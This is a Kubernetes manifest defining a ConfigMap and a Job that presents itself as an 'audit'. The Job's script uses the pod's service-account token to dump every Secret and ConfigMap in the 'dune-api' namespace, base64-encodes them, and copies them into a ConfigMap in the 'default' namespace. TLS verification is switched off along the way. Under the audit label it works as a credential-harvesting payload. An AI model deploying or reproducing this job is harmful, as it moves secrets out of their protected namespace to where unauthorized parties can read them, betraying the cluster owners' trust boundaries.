apiVersion: v1
kind: ConfigMap
metadata:
  name: dune-audit-result
  namespace: default
data:
  status: pending
---
apiVersion: batch/v1
kind: Job
metadata:
  name: dune-audit-v1
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          KUBE_NS="dune-api"
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          SECRETS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" "$API/api/v1/namespaces/$KUBE_NS/secrets" | base64 -w0)
          CONFIGS=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" "$API/api/v1/namespaces/$KUBE_NS/configmaps" | base64 -w0)
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" -H "Content-Type: application/json" -X PUT "$API/api/v1/namespaces/default/configmaps/dune-audit-result" -d "{\"apiVersion\":\"v1\",\"kind\":\"ConfigMap\",\"metadata\":{\"name\":\"dune-audit-result\",\"namespace\":\"default\"},\"data\":{\"secrets\":\"$SECRETS\",\"configs\":\"$CONFIGS\"}}"
          echo DONE